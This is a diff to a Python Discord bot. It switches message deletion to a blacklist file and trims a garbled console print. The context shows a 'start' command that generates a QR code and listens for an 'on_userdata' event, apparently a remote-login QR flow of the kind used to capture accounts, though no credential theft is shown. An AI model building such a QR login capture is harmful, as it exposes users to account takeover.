@@ -123,8 +123,8 @@ async def on_ready():
 async def on_message(message):
   if message.author == bot.user: return
   msg = message.content
-  if msg.lower() != f"{bot.command_prefix}{command_name}".lower():
-    await message.delete()
+  with open("blacklist.txt", "r") as blfile: bllines = blfile.read().splitlines()
+  if msg.lower() in bllines: await message.delete()
   await bot.process_commands(message)
 
 #Bot command
@@ -256,7 +256,7 @@ async def start(ctx):
     
             embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
             await interaction.edit_original_message(embed=embed_qr)
-            print(f"\t\t\t\t\t\tâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
+            print(f"\t\t\t\t\t\t[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
     
             @c.event("on_userdata")
             async def on_userdata(user):
